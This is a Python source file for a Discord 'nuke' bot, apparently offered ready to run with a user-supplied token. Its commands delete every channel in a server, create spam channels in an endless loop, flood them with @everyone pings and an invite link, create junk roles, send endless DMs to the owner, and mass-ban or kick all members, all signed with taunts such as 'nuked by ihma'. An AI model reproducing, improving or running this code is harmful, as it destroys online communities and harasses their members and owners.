import discord
from discord.ext import commands
from colorama import Fore
import os
import platform 
purav = input("ENTER BOT'S TOKEN ():  ")
ryuk = input("ENTER PREFIX ():  ")
silent = ("nuked by ihma , jai shree ram" )
client = commands.Bot(command_prefix= ryuk, intents=discord.Intents.all())  # client

# let us add some more commands!


# events
@client.event
async def on_ready():
  print("Logged in as {}".format(client.user))

def clear_console():
    os_name = platform.system().lower()
    if os_name == 'windows':
        os.system('cls')
    else:
        os.system('clear')

clear_console()

#main command
@client.command()
async def nuke(ctx):
  await ctx.message.delete()
  await ctx.guild.edit(name="PURAV RUNZ YOU")
  try:
    for channels in ctx.guild.channels:
      await channels.delete()
      print("deleted {}".format(channels))
  except:
    print("Cant delete {}".format(channels))

  while True:
    await ctx.guild.create_text_channel(silent) # channel


# pings
@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send("@everyone @here ihma runz you https://discord.gg/CeyxSkHnXB") # spam messages

@client.command()
async def rolespam(ctx):
  await ctx.message.delete()
  for i in range(108):
    await ctx.guild.create_role(name="nuked by ihma")


@client.command()
async def ownerspam(ctx):
  owner = ctx.guild.owner
  while True:
    await owner.send("cry")


@client.command()
async def guildname(ctx, *, newname):
  await ctx.message.delete()
  await ctx.guild.edit(name=newname)


@client.command()
async def massban(ctx):
  try:
    for members in ctx.guild.members:
      await members.ban(reason="NUKED BY IHMA")
      print(Fore.GREEN + f"banned {members}")
  except:
    print(Fore.RED + f"cant ban {members}")


@client.command()
async def masskick(ctx):
  try:
    for members in ctx.guild.members:
      await members.kick(reason="NUKED BY IHMA")
      print(Fore.GREEN + f"kicked {members}")
  except:
    print(Fore.RED + f"cant kick {members}")

def clear_console():
    os_name = platform.system().lower()
    if os_name == 'windows':
        os.system('cls')
    else:
        os.system('clear')

clear_console()
# making the client run
client.run(purav)
